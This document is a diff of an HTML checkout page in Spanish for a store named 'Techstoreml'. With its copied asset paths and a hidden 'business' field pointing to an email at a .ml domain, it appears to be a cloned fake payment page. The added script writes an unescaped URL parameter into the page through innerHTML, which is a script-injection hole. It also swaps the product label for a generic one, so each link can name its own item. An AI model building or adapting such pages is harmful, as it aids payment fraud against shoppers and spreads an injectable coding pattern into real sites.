@@ -39,6 +39,10 @@
 		document.getElementById('item_name2').value = searchRegExp;
 		document.getElementById('amount2').value = getQueryVariable('amount');
 		
+        document.getElementById('mitem').innerHTML = searchRegExp;
+		searchRegExp = searchRegExp.split('%20').join(' ');
+		document.getElementById('mitem').innerHTML = searchRegExp;
+		
       }
    
     </script> 
@@ -230,7 +234,7 @@
   <li class="options-list__item item-otros"><input type="radio" class="u-hide" id="otros" name="[ui_components][group_content][group_nested_pages][group_page_nested_bank_transfer][group_form_scroller][select_nested_payment_option]" value="[otros]"><label class="options-list__label" for="otros"><div class="group-media-object" id=""><div><div class="icon-wrapper"><img src="./transferencias_files/98340770-35ff-11e9-aa33-95fcc1ba1ce0-l.svg" alt="Transferencia SPEI" title=""></div></div>
   <a id="efectivobtn"><div class="row-details"><div class="title"><span class="text">Transferencia SPEI</span></div><div class="text"><span>El pago se acreditará en menos de 1 hora.</span></div></div></a>
   </div></label></li></ul></form></div></div><div class="layout__col-sidebar"><div class="brand"><span class="brand__img"><img src="./transferencias_files/bag.png" alt="Techstoreml" title="Techstoreml"></span><span class="brand__name brand__name__small">Techstoreml</span></div><div class="group-summary"><div class="group-summary__container"><h2 id="" class="title-h2"><span>Detalle de tu compra</span></h2><div class="row-summary">
-  <span class="row-summary__text " id="mitem">RECARGA MOVISTAR</span><span class="row-summary__price " id="mprecio">$ 10</span></div></div></div></div></div></div></main></div>
+  <span class="row-summary__text " id="mitem">PRODUCTO</span><span class="row-summary__price " id="mprecio">$ 10</span></div></div></div></div></div></div></main></div>
   
   <form class="form" method="GET" action="checkout_v1_payment_redirect_0a5dbcbb-bec7-4d9e-a63d-269317184802_payment-option-form__source=transfer_citi.html">
 <input type="hidden" name="business" id="business" value="gshield811@soberanosoft.ml">
